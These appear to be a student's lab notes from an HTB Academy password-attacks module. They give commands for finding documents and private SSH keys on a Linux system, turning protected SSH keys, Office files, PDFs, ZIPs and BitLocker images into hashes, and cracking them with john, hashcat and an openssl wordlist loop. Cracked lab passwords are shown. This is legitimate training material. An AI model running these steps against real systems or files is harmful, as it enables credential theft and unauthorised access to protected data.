## HTB-ACADEMY (Passsword attacks / Cracking Files)
## Ivan Medina
---

### Protected files

##### **Hunting for Files**

```for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done```

##### **Hunting for SSH Keys**

```grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"```

##### **Encrypted SSH Keys**

```cat /home/cry0l1t3/.ssh/SSH.private```

##### **Cracking with John**

```
ivxnmxdxnx@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
ivxnmxdxnx@htb[/htb]$ cat ssh.hash 
ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
```

##### **Cracking SSH Keys**

```john --wordlist=rockyou.txt ssh.hash```

```
ivxnmxdxnx@htb[/htb]$ john ssh.hash --show
SSH.private:1234
1 password hash cracked, 0 left
```

If trigger error:

```
─[eu-academy-1]─[10.10.14.129]─[htb-ac206766@pwnbox-base]─[~]
└──╼ [★]$ python3 /usr/share/john/ssh2john.py id_rsa > ssh.hash
Traceback (most recent call last):
  File "/usr/share/john/ssh2john.py", line 193, in <module>
    read_private_key(filename)
  File "/usr/share/john/ssh2john.py", line 103, in read_private_key
    data = base64.decodestring(data)

```

Could do this...

```
─[eu-academy-1]─[10.10.14.129]─[htb-ac206766@pwnbox-base]─[~]
└──╼ [★]$ locate ssh2john
locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 382.8 days)
/usr/share/john/ssh2john.py
─[eu-academy-1]─[10.10.14.129]─[htb-ac206766@pwnbox-base]─[~]
└──╼ [★]$ sed 's/decodestring/decodebytes/' /usr/share/john/ssh2john.py | python3 - id_rsa  > ssh.hash
```


##### **Cracking Microsoft Office Documents**

```
ivxnmxdxnx@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
ivxnmxdxnx@htb[/htb]$ cat protected-docx.hash
Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
```

```john --wordlist=rockyou.txt protected-docx.hash```

```
ivxnmxdxnx@htb[/htb]$ john protected-docx.hash --show
Protected.docx:1234
```

##### **Cracking PDFs**

```
ivxnmxdxnx@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
ivxnmxdxnx@htb[/htb]$ cat pdf.hash 
PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
```

```ivxnmxdxnx@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash```

```
ivxnmxdxnx@htb[/htb]$ john pdf.hash --show
PDF.pdf:1234
1 password hash cracked, 0 left
```

### Protected Archives

##### **Download All File Extensions**

```curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt```

##### **Cracking ZIP**

##### *Using zip2john*

```zip2john ZIP.zip > zip.hash```

##### *Viewing the Contents of zip.hash*

```
ivxnmxdxnx@htb[/htb]$ cat zip.hash 
ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```

##### *Cracking the Hash with John*

```john --wordlist=rockyou.txt zip.hash```

##### *Viewing the Cracked Hash*

```
ivxnmxdxnx@htb[/htb]$ john zip.hash --show
ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip
1 password hash cracked, 0 left
```

##### **Cracking OpenSSL Encrypted Archives**

##### *Using a for-loop to Display Extracted Contents*

```for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done```

##### **Cracking BitLocker Encrypted Drives**

##### *Using bitlocker2john*

```
ivxnmxdxnx@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
ivxnmxdxnx@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
ivxnmxdxnx@htb[/htb]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
```

##### *Using hashcat to Crack backup.hash*

```hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked```

##### *Viewing the Cracked Hash*

```
ivxnmxdxnx@htb[/htb]$ cat backup.cracked 
$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
```